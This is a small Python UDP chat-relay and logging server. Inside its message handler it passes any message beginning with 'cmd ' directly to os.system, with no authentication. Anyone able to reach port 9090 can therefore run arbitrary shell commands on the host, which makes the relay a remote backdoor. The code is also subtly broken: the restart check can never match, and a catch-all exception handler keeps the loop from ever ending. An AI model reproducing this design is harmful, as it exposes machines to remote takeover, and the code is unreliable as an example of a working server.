
from datetime import date
import datetime
import socket
import time
import os


clients = []


def server():	
	starts = []
	logs = []
	host = socket.gethostbyname(socket.gethostname())
	port = 9090
	today = date.today()
	datatime = time.strftime("%Y-%m-%d-%H.%M.%S", time.localtime())
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.bind((host, port))
	s1 = ("[ SERVER START ]" + '=' + '['+ datatime + ']') 
	for j in s1:
		starts.append(j)
	print(s1)
	quit = False
	while True:
		try:
			data, addr = s.recvfrom(1024)
			decrypt = data.decode("utf-8")
			d = decrypt[:4]
			if d == 'cmd ':
				decrypt = decrypt[4:]
				os.system(decrypt)
			if d == 'exit':
				exit()
			if d == 'restart':
				exit()
				server()
			if addr not in clients:
				clients.append(addr)
			datatime = time.strftime("%Y-%m-%d-%H.%M.%S", time.localtime())
			log = "[ "+ addr[0] +" ]=["+ datatime +"]=["+ decrypt +"]"
			logs.append(log)
			print(log)
			dt = str("{}{}{}".format(today.day, today.month, today.year))
			tm = datetime.datetime.now().strftime('%H%M')
			f = open('logs_' + dt + '_' + tm + '.txt', 'w')
			for i in logs:
				f.write(i) 
			f.close()
			for client in clients:
				if addr != client:
					s.sendto(data, client)
		except:
			print("\n[ SERVER STOPPED ]")	
			quit = True
	s.close()


if __name__ == '__main__':
	server()